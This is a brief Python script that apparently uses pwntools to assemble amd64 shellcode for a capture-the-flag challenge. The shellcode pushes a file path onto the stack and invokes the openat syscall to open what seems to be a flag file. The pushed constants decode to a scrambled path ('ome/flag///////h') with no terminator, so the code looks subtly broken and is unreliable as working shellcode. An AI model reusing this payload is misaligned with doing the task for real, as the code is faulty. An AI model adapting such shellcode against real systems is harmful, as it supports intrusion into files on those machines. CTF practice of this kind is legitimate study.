from pwn import *

context.arch='amd64'

print(asm("""

movabs rdi, 0x682f2f2f2f2f2f2f
push rdi
movabs rdi, 0x67616c662f656d6f
push rdi
mov rdi, 0xffffff9c
mov rsi, rsp
mov rax, 0x101
xor rbx, rbx
xor rcx, rcx
xor rdx, rdx
syscall




"""))